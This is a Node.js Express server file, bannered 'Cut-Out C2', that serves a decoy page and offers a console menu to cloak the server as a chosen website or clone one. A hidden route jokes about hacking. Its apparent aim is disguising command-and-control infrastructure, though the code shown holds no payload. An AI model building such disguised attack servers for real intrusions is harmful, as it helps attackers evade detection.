const express	= require('express');
const http    	= require('http');
const path    	= require('path');
const fs      	= require('fs');

const remove 	= require('./remove_route');
const ui 	= require('./user_interface');
const tools 	= require('./tools');

const port = 3000

var app = express();

app.get('/hidden', (req, res) => {
  res.send("Sup bro? Wanna hack?")
})

app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'html/index.html'))
})

app.listen(port, console.log('Server started on port ' + port));

console.log("   _____      _           ____        _      _____ ___  ")
console.log("  / ____|    | |         / __ \\      | |    / ____|__ \\ ")
console.log(" | |    _   _| |_ ______| |  | |_   _| |_  | |       ) |")
console.log(" | |   | | | | __|______| |  | | | | | __| | |      / / ")
console.log(" | |___| |_| | |_       | |__| | |_| | |_  | |____ / /_ ")
console.log("  \\_____\\__,_|\\__|       \\____/ \\__,_|\\__|  \\_____|____|")
console.log(" #######################################################")

//Detect if we have a non-default html directory nearby
if (fs.existsSync(path.join(__dirname, './custom-html'))){
  console.log("Custom HTML Directory Detected!");
}

// Offer the user choices
console.log("(s) Chose A Website To Cloak As");
console.log("(c) Clone A Website");

// This will take user input
taking_input = function () {
  ui.prompt(">> ", function(input) {
    // We now have the input, now let's check what to do with it
    if (input === 's') {
      tools.choose_a_website( function(output)  {
        remove.remove_route(app, '*');
        app.use('/', express.static('html/'+output+'/'+output))
      });
    }
    else if (input === 'c') {
      // Clone A Website
      tools.clone_a_website();
    }
    else if (input === 'd') {
      console.log("DD");
    }
    taking_input();
  });
}
taking_input();
